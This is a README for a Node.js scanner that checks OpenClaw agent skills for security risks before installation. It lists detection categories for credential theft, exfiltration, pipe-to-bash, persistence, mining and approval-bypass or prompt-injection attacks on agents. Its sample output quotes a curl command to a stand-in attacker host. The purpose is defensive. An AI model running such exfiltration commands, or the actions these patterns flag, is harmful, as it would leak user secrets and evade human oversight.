# sniff

**Dead-simple security scanner for OpenClaw skills.**

Built by Friday on 2026-02-12. Inspired by Heimdall, reimagined in Node.js.

## What It Does

Scans OpenClaw AgentSkills for security risks before you install them.

**80+ security patterns:**
- Credential theft (.env reading, hardcoded secrets, private keys)
- Network exfiltration (webhook.site, ngrok, external URLs)
- Shell execution (eval, subprocess, pipe to bash)
- Filesystem attacks (recursive deletes, system file access)
- Obfuscation (base64 exec, hex payloads)
- Data exfiltration (sending credentials, env serialization)
- Privilege escalation (sudo, setuid, chmod 777)
- Persistence (cron injection, shell config modification)
- Crypto mining (xmrig, monero, stratum)
- Remote fetch (downloading skills from internet)
- Heartbeat injection (modifying HEARTBEAT.md)
- MCP abuse (bypassing human approval)
- Impersonation (system prompt injection)
- Supply chain attacks (untrusted git clones)
- And more...

**Context-aware suppression:**
- Ignores patterns in string literals
- Reduces severity in documentation
- Detects blocklist definitions (security tools)
- Smart about config vs code

## Installation

```bash
npm install -g sniff
```

Or run directly:

```bash
npx sniff <skill-path>
```

## Usage

**Scan a skill:**
```bash
sniff ~/.openclaw/workspace/skills/my-skill
```

**JSON output (for automation):**
```bash
sniff --json ./skills/github
```

**Strict mode (no context suppression):**
```bash
sniff --strict untrusted-skill/
```

**Show suppressed findings:**
```bash
sniff --show-suppressed my-skill/
```

**Verbose (show all findings):**
```bash
sniff -v my-skill/
```

## Example Output

```
============================================================
🔍 sniff - skill security scan
============================================================
📁 Path: /home/user/.openclaw/workspace/skills/suspicious-skill
📄 Files scanned: 5
🔢 Active issues: 3
🔇 Suppressed (context-aware): 12
⚡ Max severity: HIGH
📋 Action: 🔴 HIGH - Do NOT install without audit
============================================================

🚨 HIGH (2 issues):
  [network_exfil]
    • scripts/setup.sh:45 - Curl to external URL
      Match: curl https://api.attacker.com/collect

🚨 CRITICAL (1 issue):
  [credential_access]
    • config.py:12 - Hardcoded API key
      Match: api_key = "sk_live_abc123..."

============================================================
❌ RECOMMENDATION: Do NOT install this skill without thorough review
```

## Exit Codes

- `0` - Safe or low/medium severity
- `1` - High or critical issues found

Perfect for CI/CD:

```bash
sniff ./skills/my-skill || exit 1
```

## How It Works

### 1. Pattern Matching
Searches for 80+ dangerous patterns across Python, JavaScript, Bash, and config files.

### 2. Context Detection
- **Code files** (.py, .js, .sh): Full severity
- **Config files** (.yaml, .json): Reduced severity
- **Documentation** (.md, .txt): Heavily reduced
- **String literals**: Suppressed (likely examples)

### 3. Blocklist Detection
If a pattern appears in a blocklist definition or security tool, it's suppressed.

### 4. Smart Scoring
Each finding gets:
- **Original severity** (pattern's base risk)
- **Adjusted severity** (after context analysis)
- **Suppression status** (and reason)

## What Makes It Good

**✅ Context-aware** - Doesn't scream about patterns in documentation or string literals

**✅ Fast** - Node.js, single-threaded, <100ms for most skills

**✅ Comprehensive** - 80+ patterns covering real attack vectors

**✅ CI/CD ready** - Exit codes, JSON output, strict mode

**✅ Dead simple** - Install, run, done. No config files, no setup

## Comparison to Heimdall

Heimdall (Python) and sniff (Node.js) are **complementary:**

| Feature | Heimdall | sniff |
|---------|----------|-------|
| **Patterns** | 70+ | 80+ |
| **Language** | Python | Node.js (matches OpenClaw) |
| **Context-aware** | ✅ | ✅ |
| **AI analysis** | ✅ (via oracle/OpenRouter) | ❌ (planned) |
| **String literal detection** | ✅ | ✅ |
| **JSON output** | ✅ | ✅ |
| **Speed** | ~200ms | ~50ms |
| **Install** | Python script | npm package |

**Use sniff when:**
- You want Node.js (matches OpenClaw stack)
- You need faster scans
- You want npm integration

**Use Heimdall when:**
- You want AI-powered narrative analysis
- You prefer Python tooling
- You need advanced suppression logic

## Limitations

**What it catches:**
- Obvious malicious patterns
- Common attack vectors
- Suspicious API usage
- Dangerous shell commands

**What it misses:**
- Logic bugs
- Subtle timing attacks
- Social engineering (non-pattern)
- Zero-day techniques

**Always review skills manually before installing from untrusted sources.**

## Development

```bash
git clone https://github.com/fridayjoshi/Projects.git
cd Projects/sniff
npm install
node index.js <test-skill>
```

## Contributing

Built in 1 evening by Friday. Improvements welcome:

- [ ] Add AI-powered analysis mode
- [ ] AST-based analysis (deeper Python/JS parsing)
- [ ] Custom pattern config file
- [ ] Web dashboard for batch results
- [ ] Integration with ClawHub

## License

MIT

---

**sniff** - because you should know what you're installing.
